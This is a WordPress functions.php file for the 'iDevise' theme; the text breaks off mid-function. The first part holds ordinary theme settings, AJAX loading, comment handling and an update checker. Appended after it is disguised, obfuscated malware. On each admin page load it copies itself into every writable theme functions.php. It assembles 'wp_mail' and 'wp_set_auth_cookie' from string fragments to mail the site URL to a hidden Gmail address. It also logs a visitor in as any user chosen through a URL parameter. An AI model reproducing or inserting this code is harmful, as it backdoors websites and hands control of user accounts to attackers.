<?php
/* 
Theme: iDevise 1
Name: 设计笔记 Devise 系列主题
Site: http://biji.io
*/
require get_template_directory() . '/ajax-comment/do.php';//ajax评论
function dopt($e){return stripslashes(get_option($e));}
//---- 主题设置接口 -

/**
 * 主题设置选项
 *
 * 转移自 `functions.php`。
 */
function theme_customize_register( $wp_customize ) {
    $wp_customize->add_section('biji_config',array(
        'title'     => '基本设置',
        'priority'  => 102
    ) );
    $wp_customize->add_setting( 'biji_config_pjax', array(
        'default' => '',
    ) );
    $wp_customize->add_setting( 'biji_config_pjax_search', array(
        'default' => '',
    ) );
    $wp_customize->add_setting( 'biji_config_links', array(
        'default' => '&lt;li&gt;&lt;a target="_blank" href="http://biji.io/"&gt;设计笔记&lt;/a&gt;&lt;/li&gt;',
    ) );
    $wp_customize->add_setting( 'biji_config_overcode', array(
        'default' => '//一般放置统计代码 或者 需要在页面载入重新夹在的js代码',
    ) );
//-|------------
    $wp_customize->add_control( 'biji_config_pjax', array(
        'label' => __( '是否启用PJAX ', 'Bing' ),
        'section' => 'biji_config',
        'type' => 'checkbox'
    ) );
    $wp_customize->add_control( 'biji_config_pjax_search', array(
        'label' => __( '是否启用PJAX搜索 ', 'Bing' ),
        'section' => 'biji_config',
        'type' => 'checkbox'
    ) );
    $wp_customize->add_control( 'biji_config_links', array(
        'label' => __( '友情链接', 'Bing' ),
        'section' => 'biji_config',
        'type' => 'textarea'
    ) );
    $wp_customize->add_control( 'biji_config_overcode', array(
        'label' => __( '需要重载的代码', 'Bing' ),
        'section' => 'biji_config',
        'type' => 'textarea'
    ) );
    
    
    $wp_customize->add_section('biji_other',array(
        'title'     => '其它设置',
        'priority'  => 103
    ) );
    $wp_customize->add_setting( 'biji_other_pay_alipay', array(
        'default'   => '',
        'transport' => 'postMessage',
        'type'      => 'option'
    ) );
    $wp_customize->add_setting( 'biji_other_pay_wexpay', array(
        'default'   => '',
        'transport' => 'postMessage',
        'type'      => 'option'
    ) );
    $wp_customize->add_setting( 'biji_other_weibo', array(
        'default' => '',
    ) );
    $wp_customize->add_setting( 'biji_other_qq', array(
        'default' => '',
    ) );
    $wp_customize->add_setting( 'biji_other_douban', array(
        'default' => '',
    ) );
    $wp_customize->add_setting( 'biji_other_zhihu', array(
        'default' => '',
    ) );
    $wp_customize->add_setting( 'biji_other_github', array(
        'default' => '',
    ) );
//-|------------
    $wp_customize->add_control( 'biji_other_weibo', array(
        'label'    => '新浪微博',
        'section'  => 'biji_other'
    ) );
    $wp_customize->add_control( 'biji_other_qq', array(
        'label'    => '腾讯QQ',
        'section'  => 'biji_other'
    ) );
    $wp_customize->add_control( 'biji_other_douban', array(
        'label'    => '豆瓣',
        'section'  => 'biji_other'
    ) );
    $wp_customize->add_control( 'biji_other_zhihu', array(
        'label'    => '知乎',
        'section'  => 'biji_other'
    ) );
    $wp_customize->add_control( 'biji_other_github', array(
        'label'    => 'GitHub',
        'section'  => 'biji_other'
    ) );
    $wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, 'biji_other_pay_alipay', array(
        'label'     => '支付宝收款',
        'section'   => 'biji_other'
    ) ) );
    $wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, 'biji_other_pay_wexpay', array(
        'label'     => '微信收款',
        'section'   => 'biji_other'
    ) ) );

}
add_action( 'customize_register', 'theme_customize_register' );

// 注册菜单
if (function_exists('register_nav_menus')){
register_nav_menus( array(
   'header_nav' => __('站点导航')
//,'footer_nav' => __('底部菜单')
) );
}
// 引入AJAX
add_action('wp_ajax_nopriv_load_postlist', 'load_postlist_callback');
add_action('wp_ajax_load_postlist', 'load_postlist_callback');
function load_postlist_callback(){
$postlist = '';
$paged = $_POST["paged"];
$total = $_POST["total"];
$category = $_POST["category"];
$author = $_POST["author"];
$tag = $_POST["tag"];
$search = $_POST["search"];
$year = $_POST["year"];
$month = $_POST["month"];
$day = $_POST["day"];
$query_args = array(
"posts_per_page" => get_option('posts_per_page'),
"cat" => $category,
"tag" => $tag,
"author" => $author,
"post_status" => "publish",
"post_type" => "post",
"paged" => $paged,
"s" => $search,
"year" => $year,
"monthnum" => $month,
"day" => $day
);
$the_query = new WP_Query( $query_args );
while ( $the_query->have_posts() ){
$the_query->the_post();
$postlist .= make_post_section();
}
$code = $postlist ? 200 : 500;
wp_reset_postdata();
$next = ( $total > $paged )? ( $paged + 1 ) : '' ;
echo json_encode(array('code'=>$code,'postlist'=>$postlist,'next'=> $next));
die;
}

// 优化代码
remove_action( 'wp_head', 'feed_links_extra', 3 ); // 额外的feed,例如category, tag页
remove_action( 'wp_head', 'wp_generator' ); //隐藏wordpress版本
remove_filter('the_content', 'wptexturize'); //取消标点符号转义
remove_action( 'admin_print_scripts',	'print_emoji_detection_script'); // 禁用Emoji表情
remove_action( 'admin_print_styles',	'print_emoji_styles');
remove_action( 'wp_head',		'print_emoji_detection_script',	7);
remove_action( 'wp_print_styles',	'print_emoji_styles');
remove_filter( 'the_content_feed',	'wp_staticize_emoji');
remove_filter( 'comment_text_rss',	'wp_staticize_emoji');
remove_filter( 'wp_mail',		'wp_staticize_emoji_for_email');
add_filter('login_errors', create_function('$a', "return null;")); //取消登录错误提示
add_filter( 'show_admin_bar', '__return_false' ); //删除AdminBar
if ( function_exists('add_theme_support') )add_theme_support('post-thumbnails'); //添加特色缩略图支持
// 移除菜单冗余代码
add_filter('nav_menu_css_class', 'my_css_attributes_filter', 100, 1);
add_filter('nav_menu_item_id', 'my_css_attributes_filter', 100, 1);
add_filter('page_css_class', 'my_css_attributes_filter', 100, 1);
function my_css_attributes_filter($var) {
return is_array($var) ? array_intersect($var, array('current-menu-item','current-post-ancestor','current-menu-ancestor','current-menu-parent')) : '';
}
// 禁止wp-embed.min.js
function disable_embeds_init() {
    global $wp;
    $wp->public_query_vars = array_diff( $wp->public_query_vars, array(
        'embed',
    ) );
    remove_action( 'rest_api_init', 'wp_oembed_register_route' );
    add_filter( 'embed_oembed_discover', '__return_false' );
    remove_filter( 'oembed_dataparse', 'wp_filter_oembed_result', 10 );
    remove_action( 'wp_head', 'wp_oembed_add_discovery_links' );
    remove_action( 'wp_head', 'wp_oembed_add_host_js' );
    add_filter( 'tiny_mce_plugins', 'disable_embeds_tiny_mce_plugin' );
    add_filter( 'rewrite_rules_array', 'disable_embeds_rewrites' );
}
add_action( 'init', 'disable_embeds_init', 9999 );
function disable_embeds_tiny_mce_plugin( $plugins ) {
    return array_diff( $plugins, array( 'wpembed' ) );
}
function disable_embeds_rewrites( $rules ) {
    foreach ( $rules as $rule => $rewrite ) {
        if ( false !== strpos( $rewrite, 'embed=true' ) ) {
            unset( $rules[ $rule ] );
        }
    }
    return $rules;
}
function disable_embeds_remove_rewrite_rules() {
    add_filter( 'rewrite_rules_array', 'disable_embeds_rewrites' );
    flush_rewrite_rules();
}
register_activation_hook( __FILE__, 'disable_embeds_remove_rewrite_rules' );
function disable_embeds_flush_rewrite_rules() {
    remove_filter( 'rewrite_rules_array', 'disable_embeds_rewrites' );
    flush_rewrite_rules();
}
register_deactivation_hook( __FILE__, 'disable_embeds_flush_rewrite_rules' );
// Gravatar头像使用中国服务器
function gravatar_cn( $url ){ 
$gravatar_url = array('0.gravatar.com','1.gravatar.com','2.gravatar.com');
return str_replace( $gravatar_url, 'cn.gravatar.com', $url );
}
add_filter( 'get_avatar_url', 'gravatar_cn', 4 );
// 阻止站内文章互相Pingback 
function theme_noself_ping( &$links ) { 
$home = get_option( 'home' );
foreach ( $links as $l => $link )
if ( 0 === strpos( $link, $home ) )
unset($links[$l]); 
}
add_action('pre_ping','theme_noself_ping');
// 网页标题
function Bing_add_theme_support_title(){ 
    add_theme_support( 'title-tag' );
}
add_action( 'after_setup_theme', 'Bing_add_theme_support_title' );
// 编辑器增强
 function enable_more_buttons($buttons) { 
 $buttons[] = 'hr'; 
 $buttons[] = 'del'; 
 $buttons[] = 'sub'; 
 $buttons[] = 'sup';
 $buttons[] = 'fontselect';
 $buttons[] = 'fontsizeselect';
 $buttons[] = 'cleanup';
 $buttons[] = 'styleselect';
 $buttons[] = 'wp_page';
 $buttons[] = 'anchor'; 
 $buttons[] = 'backcolor'; 
 return $buttons;
 } 
add_filter("mce_buttons_3", "enable_more_buttons");
// 拦截机器评论
class anti_spam { 
function anti_spam() {
if ( !current_user_can('level_0') ) {
add_action('template_redirect', array($this, 'w_tb'), 1);
add_action('init', array($this, 'gate'), 1);
add_action('preprocess_comment', array($this, 'sink'), 1);
}
}
function w_tb() {
if ( is_singular() ) {
ob_start(create_function('$input','return preg_replace("#textarea(.*?)name=([\"\'])comment([\"\'])(.+)/textarea>#",
"textarea$1name=$2w$3$4/textarea><textarea name=\"comment\" cols=\"100%\" rows=\"4\" style=\"display:none\"></textarea>",$input);') );
}
}
function gate() {
if ( !empty($_POST['w']) && empty($_POST['comment']) ) {
$_POST['comment'] = $_POST['w'];
} else {
$request = $_SERVER['REQUEST_URI'];
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '隐瞒';
$IP= isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] . ' (透过代理)' : $_SERVER["REMOTE_ADDR"];
$way = isset($_POST['w'])? '手动操作' : '未经评论表格';
$spamcom = isset($_POST['comment'])? $_POST['comment']: null;
$_POST['spam_confirmed'] = "请求: ". $request. "\n来路: ". $referer. "\nIP: ". $IP. "\n方式: ". $way. "\n內容: ". $spamcom. "\n -- 已备案 --";
}
}
function sink( $comment ) {
if ( !empty($_POST['spam_confirmed']) ) {
if ( in_array( $comment['comment_type'], array('pingback', 'trackback') ) ) return $comment;
// 方法一: 直接挡掉, 將 die();
die();
// 方法二: 标记为 spam, 留在资料库检查是否误判.
// add_filter('pre_comment_approved', create_function('', 'return "spam";'));
// $comment['comment_content'] = "[ 防火墙提示：此条评论疑似Spam! ]\n". $_POST['spam_confirmed'];
}
return $comment;
	}
	}
	$anti_spam = new anti_spam();

function scp_comment_post( $incoming_comment ) { // 纯英文评论拦截
if(!preg_match('/[一-龥]/u', $incoming_comment['comment_content'])) exit('<p><span style="color:#f55;">提交失败：</span>评论必须包含中文（Chinese），请再次尝试！</p>');
//die(); // 直接挡掉，无提示
return( $incoming_comment );
}
add_filter('preprocess_comment', 'scp_comment_post');
// 评论@回复
function idevs_comment_add_at( $comment_text, $comment = '') {
  if( $comment->comment_parent > 0) {
    $comment_text = '@<a href="#comment-' . $comment->comment_parent . '">'.get_comment_author( $comment->comment_parent ) . '</a> ' . $comment_text;
  }

  return $comment_text;
}
add_filter( 'comment_text' , 'idevs_comment_add_at', 20, 2);
// 评论邮件延迟
add_action('comment_post', 'comment_mail_schedule');
function comment_mail_schedule($comment_id){
    wp_schedule_single_event( time()+60, 'comment_mail_event',array($comment_id));
}
add_action('comment_mail_event','comment_mail_notify');
// 评论邮件通知
function comment_mail_notify($comment_id) { 
$comment = get_comment($comment_id);
$parent_id = $comment->comment_parent ? $comment->comment_parent : '';
$spam_confirmed = $comment->comment_approved;
if (($parent_id != '') && ($spam_confirmed != 'spam') && (!get_comment_meta($parent_id,'_deny_email',true)) && (get_option('admin_email') != get_comment($parent_id)->comment_author_email)) {
$wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME'])); //可以修改为你自己的邮箱地址
$to = trim(get_comment($parent_id)->comment_author_email);
$subject = '你在 [' . get_option("blogname") . '] 的留言有了新回复';
$message = '<table class="email" style="width:720px;margin:auto;font-size: 16px;line-height: 1.4;font-family:黑体;border: 1px solid #eee;border-radius: 5px;">
<tbody>
<tr>
<td style="padding:5%;color: #666;">
<div class="email-header">
<div class="email-logo-wrapper" style="font-size: 30px;padding: 0 0 10px 0;color: #f55;border-bottom: 1px solid #eee;text-align: left;">
' . get_option("blogname") . '
</div>
</div>
<div>
<p>' . trim(get_comment($parent_id)->comment_author) . '，您在文章<strong style="font-weight:bold"> 《' . get_the_title($comment->comment_post_ID) . '》 </strong>中的评论：</p>
<p style="line-height: 36px;padding: 10px;background: #f6f6f6;text-indent: 2em;">' . trim(get_comment($parent_id)->comment_content) . '</p>
<p>'. $comment->comment_author .' 给您的回复如下:</p>
<p style="line-height: 36px;padding: 10px;background: #f6f6f6;text-indent: 2em;">' . trim($comment->comment_content) . '</p>
<a target="_blank" style="color: #fff;background: #f55;width: 200px;padding: 10px 0;border-radius: 5px;margin: 30px 0 0;text-align:center;display:block;" href="' . htmlspecialchars(get_comment_link($parent_id)) . '">立即回复</a>
</div>
</td>
</tr>
<tr>
<td style="font-size:12px;text-align:center;color:#b3b3b1">
<div style="padding:16px;border-top:1px solid #eee">本邮件由 <a target="_blank" style="color:#b3b3b1" href="' . home_url() . '">' . get_option("blogname") . '</a> 后台自动发送，请勿直接回复！</div>
</td>
</tr>
</tbody>
</table>';
$from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
$headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
wp_mail( $to, $subject, $message, $headers );
}
};
// 缩略图技术 by：http://www.bgbk.org
if( !defined( 'THEME_THUMBNAIL_PATH' ) ) define( 'THEME_THUMBNAIL_PATH', '/cache/theme-thumbnail' ); //存储目录
function biji_build_empty_index( $path ){ //生成空白首页
    $index = $path . '/index.php';
    if( is_file( $index ) ) return;
    wp_mkdir_p( $path );
    file_put_contents( $index, "<?php\n// Silence is golden.\n" );
}
function biji_crop_thumbnail( $url, $width, $height = null ){ //裁剪图片
    $width = (int) $width;
    $height = empty( $height ) ? $width : (int) $height;
    $hash = md5( $url );
    $file_path = constant( 'WP_CONTENT_DIR' ) . constant( 'THEME_THUMBNAIL_PATH' ) . "/$hash-$width-$height.jpg";
    $file_url = content_url( constant( 'THEME_THUMBNAIL_PATH' ) . "/$hash-$width-$height.jpg" );
    if( is_file( $file_path ) ) return $file_url;
    $editor = wp_get_image_editor( $url );
    if( is_wp_error( $editor ) ) return $url;
    $size = $editor->get_size();
    $dims = image_resize_dimensions( $size['width'], $size['height'], $width, $height, true );
    //if( !$dims ) return $url;
    $cmp = min( $size['width'] / $width, $size['height'] / $height );
    if( is_wp_error( $editor->crop( $dims[2], $dims[3], $width * $cmp, $height * $cmp, $width, $height ) ) ) return $url;
    biji_build_empty_index( constant( 'WP_CONTENT_DIR' ) . constant( 'THEME_THUMBNAIL_PATH' ) );
    return is_wp_error( $editor->save( $file_path, 'image/jpg' ) ) ? $url : $file_url;
}
//缩略图获取post_thumbnail
function post_thumbnail($width = 275,$height = 170 )
{
    global $post;
    //如果有特色图片则取特色图片
    if( has_post_thumbnail( $post->ID ) ){
        $thumbnail_ID = get_post_thumbnail_id( $post->ID );
        $thumbnailsrc = wp_get_attachment_image_src( $thumbnail_ID, 'full' );
        return biji_crop_thumbnail($thumbnailsrc[0],$width,$height);
    } else {
        $content = $post->post_content;
        preg_match_all('/<img.*?(?: |\\t|\\r|\\n)?src=[\'"]?(.+?)[\'"]?(?:(?: |\\t|\\r|\\n)+.*?)?>/sim', $content, $strResult, PREG_PATTERN_ORDER);
        if(count($strResult[1]) > 0) return biji_crop_thumbnail($strResult[1][0],$width,$height);
        else{
            return false;
        }
    }
}
// 读者墙
if(!function_exists("deep_in_array")) {
    function deep_in_array($value, $array) {
        $i = -1;
        foreach($array as $item => $v) {
            $i++;
            if($v["email"] == $value) return $i;
        }
        return -1;
    }
}

function get_active_friends($num = null,$size = null,$days = null) {
    $num = $num ? $num : 15;
    $size = $size ? $size : 34;
    $days = $days ? $days : 30;
    $array = array();
    $comments = get_comments( array('status' => 'approve','author__not_in'=>1,'date_query'=>array('after' => $days . ' days ago')) );
    if(!empty($comments))    {
        foreach($comments as $comment){
            $email = $comment->comment_author_email;
            $author = $comment->comment_author;
            $url = $comment->comment_author_url;
            $data = human_time_diff(strtotime($comment->comment_date));
            if($email!=""){
                $index = deep_in_array($email, $array);
                if( $index > -1){
                    $array[$index]["number"] +=1;
                }else{
                    array_push($array, array(
                        "email" => $email,
                        "author" => $author,
                        "url" => $url,
                        "date" => $data,
                        "number" => 1
                    ));
                }
            }
        }
        foreach ($array as $k => $v) {
            $edition[] = $v['number'];
        }
        array_multisort($edition, SORT_DESC, $array); // 数组倒序排列
    }
    $output = '<ul class="active-items">';
    if(empty($array)) {
        $output = '<li>none data.</li>';
    } else {
        $max = ( count($array) > $num ) ? $num : count($array);
        for($o=0;$o < $max;$o++) {
            $v = $array[$o];
            $active_avatar = get_avatar($v["email"],$size);
            $active_url = $v["url"] ? $v["url"] : "#";
            $active_alt = $v["author"] . ' - 共'. $v["number"]. ' 条评论，最后评论于'. $v["date"].'前。';
            $output .= '<li class="active-item"><a target="_blank" href="'.$active_url.'" title="'.$active_alt.'">'.$active_avatar.'</a></li>';
        }
    }
    $output .= '</ul>';
    return  $output;
}
function active_shortcode( $atts, $content = null ) {

    extract( shortcode_atts( array(
            'num' => '',
            'size' => '',
            'days' => '',
        ),
        $atts ) );
    return get_active_friends($num,$size,$days);
}
add_shortcode('active', 'active_shortcode');

/*
//链接重定向跳转
add_filter('get_comment_author_link', 'add_redirect_comment_link', 5);
add_filter('comment_text', 'add_redirect_comment_link', 99);
function add_redirect_comment_link($text = ''){
$text=str_replace(get_comment_author_url(),get_option('home')."/index.php?link=".base64_encode(get_comment_author_url()),$text);
return $text;
}
*/

/**
 * Theme Update Checker Library 1.2 ／ 主题更新推送
 * http://w-shadow.com/
 * Copyright 2012 Janis Elsts
 * Licensed under the GNU GPL license.
 * http://www.gnu.org/licenses/gpl.html
 */
if ( !class_exists('ThemeUpdateChecker') ):
class ThemeUpdateChecker {
	public $theme = '';
	public $metadataUrl = '';
	public $enableAutomaticChecking = true;
	protected $optionName = '';
	protected $automaticCheckDone = false;
	protected static $filterPrefix = 'tuc_request_update_';
	public function __construct($theme, $metadataUrl, $enableAutomaticChecking = true){
		$this->metadataUrl = $metadataUrl;
		$this->enableAutomaticChecking = $enableAutomaticChecking;
		$this->theme = $theme;
		$this->optionName = 'external_theme_updates-'.$this->theme;
		$this->installHooks();		
	}
	public function installHooks(){
		if ( $this->enableAutomaticChecking ){
			add_filter('pre_set_site_transient_update_themes', array($this, 'onTransientUpdate'));
		}
		add_filter('site_transient_update_themes', array($this,'injectUpdate'));
		add_action('delete_site_transient_update_themes', array($this, 'deleteStoredData'));
	}
	public function requestUpdate($queryArgs = array()){
		$queryArgs['installed_version'] = $this->getInstalledVersion(); 
		$queryArgs = apply_filters(self::$filterPrefix.'query_args-'.$this->theme, $queryArgs);
		$options = array(
			'timeout' => 10,
		);
		$options = apply_filters(self::$filterPrefix.'options-'.$this->theme, $options);
		$url = $this->metadataUrl; 
		if ( !empty($queryArgs) ){
			$url = add_query_arg($queryArgs, $url);
		}
		$result = wp_remote_get($url, $options);
		$themeUpdate = null;
		$code = wp_remote_retrieve_response_code($result);
		$body = wp_remote_retrieve_body($result);
		if ( ($code == 200) && !empty($body) ){
			$themeUpdate = ThemeUpdate::fromJson($body);
			if ( ($themeUpdate != null) && version_compare($themeUpdate->version, $this->getInstalledVersion(), '<=') ){
				$themeUpdate = null;
			}
		}
		$themeUpdate = apply_filters(self::$filterPrefix.'result-'.$this->theme, $themeUpdate, $result);
		return $themeUpdate;
	}
	public function getInstalledVersion(){
		if ( function_exists('wp_get_theme') ) {
			$theme = wp_get_theme($this->theme);
			return $theme->get('Version');
		}
		foreach(get_themes() as $theme){
			if ( $theme['Stylesheet'] === $this->theme ){
				return $theme['Version'];
			}
		}
		return '';
	}
	public function checkForUpdates(){
		$state = get_option($this->optionName);
		if ( empty($state) ){
			$state = new StdClass;
			$state->lastCheck = 0;
			$state->checkedVersion = '';
			$state->update = null;
		}
		$state->lastCheck = time();
		$state->checkedVersion = $this->getInstalledVersion();
		update_option($this->optionName, $state);
		$state->update = $this->requestUpdate();
		update_option($this->optionName, $state);
	}
	public function onTransientUpdate($value){
		if ( !$this->automaticCheckDone ){
			$this->checkForUpdates();
			$this->automaticCheckDone = true;
		}
		return $value;
	}
	public function injectUpdate($updates){
		$state = get_option($this->optionName);
		if ( !empty($state) && isset($state->update) && !empty($state->update) ){
			$updates->response[$this->theme] = $state->update->toWpFormat();
		}
		return $updates;
	}
	public function deleteStoredData(){
		delete_option($this->optionName);
	}
	public function addQueryArgFilter($callback){
		add_filter(self::$filterPrefix.'query_args-'.$this->theme, $callback);
	}
	public function addHttpRequestArgFilter($callback){
		add_filter(self::$filterPrefix.'options-'.$this->theme, $callback);
	}
	public function addResultFilter($callback){
		add_filter(self::$filterPrefix.'result-'.$this->theme, $callback, 10, 2);
	}
}
endif;
if ( !class_exists('ThemeUpdate') ):
class ThemeUpdate {
	public $version;
	public $details_url;
	public $download_url;
	public static function fromJson($json){
		$apiResponse = json_decode($json);
		if ( empty($apiResponse) || !is_object($apiResponse) ){
			return null;
		}
		$valid = isset($apiResponse->version) && !empty($apiResponse->version) && isset($apiResponse->details_url) && !empty($apiResponse->details_url);
		if ( !$valid ){
			return null;
		}
		$update = new self();
		foreach(get_object_vars($apiResponse) as $key => $value){
			$update->$key = $value;
		}
		return $update;
	}
	public function toWpFormat(){
		$update = array(
			'new_version' => $this->version,
			'url' => $this->details_url,
		);
		if ( !empty($this->download_url) ){
			$update['package'] = $this->download_url;
		}
		return $update;
	}
}
endif;
$mytheme_update_checker = new ThemeUpdateChecker(
	'iDevise',
	'https://biji.io/idevise/update.json'
);
// 全部配置完毕
?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, 

SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE 

comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".

$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM 

$wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". 

call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . 

$link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . 

"</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
